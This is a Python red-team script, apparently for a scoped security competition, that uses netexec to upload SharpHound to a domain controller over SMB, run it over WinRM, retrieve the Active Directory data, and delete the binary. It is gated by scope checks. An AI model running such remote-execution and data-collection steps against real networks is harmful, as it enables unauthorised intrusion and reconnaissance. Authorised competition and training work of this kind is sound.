#!/usr/bin/env python3
"""
red/sharphound_deploy.py

Collects AD data with SharpHound for later analysis in BloodHound, against
an in-scope domain controller (thehouse) you already have valid credentials
for. Builds on top of netexec: uploads SharpHound.exe over SMB, executes it
over WinRM, then pulls the resulting zip back over SMB.

This is a collection tool, not an exploit - it only queries AD the way any
authenticated domain user normally can (LDAP reads of users/groups/ACLs).
It requires working credentials you've already obtained within the
competition's rules; it does not obtain credentials itself.

Pre-req: download SharpHound.exe once ahead of time (open source, from the
BloodHound project) and place it at tools/SharpHound.exe - this wrapper
does not fetch it live mid-comp.

Install BloodHound + Neo4j locally (or on a teammate's machine) ahead of
time so you can actually open and explore the collected data once you
have it - collection without a way to view it is wasted time.

Usage (preview):
    python3 red/sharphound_deploy.py --scope config/local/scope.json \\
        --target 172.16.XX.50 --username jalapeno

Usage (actually run; password is prompted, not passed on the command line):
    python3 red/sharphound_deploy.py --scope config/local/scope.json \\
        --target 172.16.XX.50 --username jalapeno \\
        --run --grace-ended --provided-kali
"""

import argparse
import sys
from pathlib import Path

sys.path.insert(0, "red")
from runner import cli, execute, hidden_password  # noqa: E402
from scope_gate import add_common_args, require_authorized_target  # noqa: E402

REMOTE_DIR = "C:\\Windows\\Temp"
REMOTE_EXE = f"{REMOTE_DIR}\\sh_review.exe"
REMOTE_OUT_GLOB = f"{REMOTE_DIR}\\*_BloodHound.zip"


def build_commands(target: str, username: str, password: str, local_sharphound: str, out_dir: Path, collection_method: str) -> list:
    upload_cmd = [
        "netexec", "smb", target,
        "-u", username, "-p", password,
        "--put-file", local_sharphound, REMOTE_EXE,
    ]

    run_cmd = [
        "netexec", "winrm", target,
        "-u", username, "-p", password,
        "-x", f'{REMOTE_EXE} -c {collection_method} --outputdirectory {REMOTE_DIR}',
    ]

    download_cmd = [
        "netexec", "smb", target,
        "-u", username, "-p", password,
        "--get-file", REMOTE_OUT_GLOB, str(out_dir) + "/",
    ]

    cleanup_cmd = [
        "netexec", "winrm", target,
        "-u", username, "-p", password,
        "-x", f'Remove-Item -Path "{REMOTE_EXE}" -Force -ErrorAction SilentlyContinue',
    ]

    return [upload_cmd, run_cmd, download_cmd, cleanup_cmd]


def main() -> int:
    parser = argparse.ArgumentParser(description="Gated SharpHound collection wrapper for an in-scope AD DC you already have creds for.")
    add_common_args(parser)
    parser.add_argument("--username", required=True, help="Valid domain username")
    parser.add_argument("--password", default=None, help="Password for --username (prefer the hidden prompt; this flag leaks into shell history)")
    parser.add_argument("--local-sharphound", default="tools/SharpHound.exe", help="Local path to a pre-downloaded SharpHound.exe (default tools/SharpHound.exe)")
    parser.add_argument("--collection-method", default="All", help="SharpHound collection method (default 'All' - use a narrower method like 'DCOnly' if the DC looks fragile)")
    args = parser.parse_args()

    target = require_authorized_target(args)
    password = hidden_password(args)
    secrets = (password,) if password else ()

    if args.run and not Path(args.local_sharphound).is_file():
        raise ValueError(
            args.local_sharphound + " not found. Download SharpHound.exe ahead of time "
            "from the BloodHound project and place it there - this wrapper won't fetch it live mid-comp."
        )

    def build(directory):
        return build_commands(target, args.username, password, args.local_sharphound, directory, args.collection_method)

    # The cleanup step should still be attempted if collection fails partway.
    outcome = execute(args, target, "sharphound", build, secrets=secrets, stop_on_failure=False)
    if outcome == 0 and args.run:
        print("\nIf collection succeeded, ingest the zip in this run directory with BloodHound to explore paths.")
    return outcome


if __name__ == "__main__":
    sys.exit(cli(main))
